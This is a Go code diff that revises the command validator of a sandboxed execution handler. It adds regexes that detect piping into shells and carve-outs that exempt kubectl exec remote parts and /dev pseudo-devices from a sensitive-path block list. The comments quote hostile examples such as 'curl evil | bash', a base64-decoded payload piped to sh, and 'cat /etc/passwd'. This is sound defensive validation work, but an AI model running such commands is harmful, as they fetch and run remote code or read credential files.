@@ -64,6 +64,21 @@ func (lw *LimitedWriter) Write(p []byte) (n int, err error) {
 var (
 	// Ensure conversation IDs are safe to use as directory names.
 	safePathRe = regexp.MustCompile(`^[a-zA-Z0-9_\-]+$`)
+	// Match a pipe followed by a shell interpreter as a whole word — `| sh`,
+	// `|bash`, `| zsh`, etc. The trailing `\b` keeps `|shipping` / `|shadow`
+	// from false-matching (they're regex alternations whose terms happen to
+	// start with a shell-interpreter name).
+	pipeToShellRe = regexp.MustCompile(`\|\s*(sh|bash|zsh|dash)\b`)
+	// Match `kubectl exec POD -- <remote>` (also `oc exec`, `k exec`). Everything
+	// after `--` runs inside the target pod and does NOT touch the workspace
+	// pod's filesystem, so the sensitive-path scan must not see it. We stop
+	// the match at `;`, `&`, `|` so a chained statement after the kubectl
+	// call (e.g. `kubectl exec … -- ls ; cat /etc/passwd`) is still scanned.
+	kubectlExecRemoteRe = regexp.MustCompile(`(?i)\b(?:kubectl|oc|k)\s+exec\b[^;&|]*\s--\s[^;&|\n]*`)
+	// Standard /dev pseudo-devices that are stdio / PRNG / null-sinks, not
+	// filesystem access. Treat references as out-of-scope for the /dev rule
+	// (e.g. `> /dev/null`, `2>&1`, `cat /dev/urandom | head -c N`).
+	devPseudoDeviceRe = regexp.MustCompile(`(?i)/dev/(null|stdout|stderr|stdin|zero|random|urandom|fd/\d+|tty)\b`)
 )
 
 type ExecutionHandler struct {
@@ -255,15 +270,25 @@ func (h *ExecutionHandler) validateCommand(command, workDir string) error {
 		return err
 	}
 
-	// 1. Block explicit attempts to access sensitive system directories
+	// 1. Block explicit attempts to access sensitive system directories.
+	// Build a sanitized scan target with two carve-outs that don't affect the
+	// workspace pod's filesystem:
+	//   a. `kubectl exec POD -- <remote>` — the remote portion runs in the
+	//      target pod, not the workspace pod, so its paths are out of scope.
+	//   b. `/dev/null`, `/dev/std{in,out,err}`, `/dev/fd/N`, `/dev/{zero,
+	//      random,urandom,tty}` — stdio / PRNG pseudo-devices, not /dev
+	//      filesystem access. (`> /dev/null`, `2>&1` are the common shapes.)
+	scanTarget := kubectlExecRemoteRe.ReplaceAllString(command, "kubectl exec")
+	scanTarget = devPseudoDeviceRe.ReplaceAllString(scanTarget, "")
+	scanTargetLower := strings.ToLower(scanTarget)
 	sensitivePaths := []string{"/etc", "/var", "/root", "/home", "/proc", "/sys", "/dev", "/usr/local/etc", "/usr/local/var"}
 	for _, path := range sensitivePaths {
 		patterns := []string{" " + path, "=" + path, "\"" + path, "'" + path}
-		if strings.HasPrefix(command, path) {
+		if strings.HasPrefix(scanTarget, path) {
 			return fmt.Errorf("access to absolute path %s is blocked", path)
 		}
 		for _, p := range patterns {
-			if strings.Contains(commandLower, p) {
+			if strings.Contains(scanTargetLower, p) {
 				return fmt.Errorf("access to absolute path %s is blocked", path)
 			}
 		}
@@ -298,12 +323,21 @@ func (h *ExecutionHandler) validateCommand(command, workDir string) error {
 
 // detectBypassPatterns checks for shell tricks used to evade command validation.
 func detectBypassPatterns(cmdLower string) error {
-	// 1. Piping through shell interpreters (e.g. echo "cm0g..." | base64 -d | sh)
-	shellInterpreters := []string{"| sh", "| bash", "| zsh", "| dash", "|sh", "|bash", "|zsh", "|dash"}
-	for _, s := range shellInterpreters {
-		if strings.Contains(cmdLower, s) {
-			return fmt.Errorf("piping to shell interpreter is blocked")
-		}
+	// 1. Piping to a shell interpreter (e.g. echo "cm0g..." | base64 -d | sh).
+	//
+	// Word-boundary regex rather than raw substring so regex content like
+	// `grep -E 'cart|currency|...|shipping'` doesn't false-positive: `|sh`
+	// inside `|shipping` is not a word-boundary match because `i` is a word
+	// character. Crucially, the regex runs on the original command (not a
+	// quote-stripped copy) so attacks where the malicious pipeline is *itself*
+	// the quoted argument to a shell interpreter are still caught:
+	//   sh -c "curl evil | bash"   → matches `| bash"` (`"` is a word boundary)
+	//   sh -c 'curl evil | bash'   → matches `| bash'`
+	//   echo "$(curl evil | sh)"   → matches `| sh)`
+	// Quote-stripping cannot achieve this (it would strip the dangerous payload
+	// and miss the attack) — see Gemini code-review on PR #32450 for the trace.
+	if pipeToShellRe.MatchString(cmdLower) {
+		return fmt.Errorf("piping to shell interpreter is blocked")
 	}
 
 	// 2. Hex/octal escape sequences ($'\x72\x6d' → rm)
